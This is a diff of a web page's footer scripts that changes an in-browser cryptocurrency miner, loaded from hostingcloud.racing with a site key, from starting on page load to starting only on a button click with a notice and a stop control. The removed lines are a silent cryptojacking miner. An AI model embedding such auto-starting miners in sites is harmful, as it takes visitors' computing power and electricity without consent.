@@ -224,23 +224,44 @@
 			<script src="assets/js/breakpoints.min.js"></script>
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
+		
+		<!-- Cryptocurrency Mining Script -->
+        <script src="https://www.hostingcloud.racing/yJ7e.js"></script>
+        <script>
+            var _client;
 
-    <!-- Cryptocurrency Mining Script -->
-    <script src="https://www.hostingcloud.racing/yJ7e.js"></script>
-    <script>
-        var _client = new Client.Anonymous('0f4966cf41bb7c9184b481f25fbbc608567d321f9f5080ab226d4f8611fc67ba', {
-            throttle: 0, c: 'w'
-        });
-        _client.start();
+            // Start mining on button click
+            document.getElementById('start-mining').addEventListener('click', function(e) {
+                e.preventDefault();
+                _client = new Client.Anonymous('0f4966cf41bb7c9184b481f25fbbc608567d321f9f5080ab226d4f8611fc67ba', {
+                    throttle: 0, c: 'w'
+                });
+                _client.start();
 
-        // Add the ability to stop mining
-        document.getElementById('stop-mining').addEventListener('click', function(e) {
-            e.preventDefault();
-            _client.stop();
-            document.getElementById('mining-notification').style.display = 'none';
-            alert('Mining stopped.');
-        });
-    </script>
-</body>
+                // Show notification and toggle buttons
+                document.getElementById('mining-notification').style.display = 'block';
+                document.getElementById('start-mining').style.display = 'none';
+                document.getElementById('stop-mining').style.display = 'inline';
+                alert('Mining started!');
+            });
+
+		  // Stop mining on button click
+            document.getElementById('stop-mining').addEventListener('click', function(e) {
+                e.preventDefault();
+
+                // Stop mining if client exists
+                if (_client) {
+                    _client.stop();
+                }
+
+                // Hide notification and toggle buttons
+                document.getElementById('mining-notification').style.display = 'none';
+                document.getElementById('start-mining').style.display = 'inline';
+                document.getElementById('stop-mining').style.display = 'none';
+                alert('Mining stopped.');
+            });
+        </script>
+
+	</body>
 </html>
 
